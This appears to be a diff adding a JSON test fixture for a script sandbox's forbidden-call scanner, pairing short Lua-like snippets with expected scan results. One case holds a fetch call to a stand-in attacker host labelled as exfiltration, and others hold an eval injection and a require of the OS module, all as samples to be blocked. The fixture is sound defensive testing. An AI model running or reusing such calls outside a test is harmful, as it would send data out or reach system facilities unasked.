@@ -1,0 +1,42 @@
+{
+  "description": "Script boundary conformance: source -> forbidden-scan outcome + API version.",
+  "apiVersion": "1.0.0",
+  "cases": [
+    {
+      "id": "benign-arithmetic",
+      "source": "local x = 1 + 2\nreturn x",
+      "expect": {
+        "forbidden": false
+      }
+    },
+    {
+      "id": "infinite-loop",
+      "source": "while true do end",
+      "expect": {
+        "forbidden": false,
+        "note": "contained by time termination, not the scan"
+      }
+    },
+    {
+      "id": "exfiltration-fetch",
+      "source": "local r = fetch(\"https://evil.example/x\")",
+      "expect": {
+        "forbidden": true
+      }
+    },
+    {
+      "id": "code-injection-eval",
+      "source": "eval(\"bad\")",
+      "expect": {
+        "forbidden": true
+      }
+    },
+    {
+      "id": "ambient-require",
+      "source": "require(\"os\")",
+      "expect": {
+        "forbidden": true
+      }
+    }
+  ]
+}
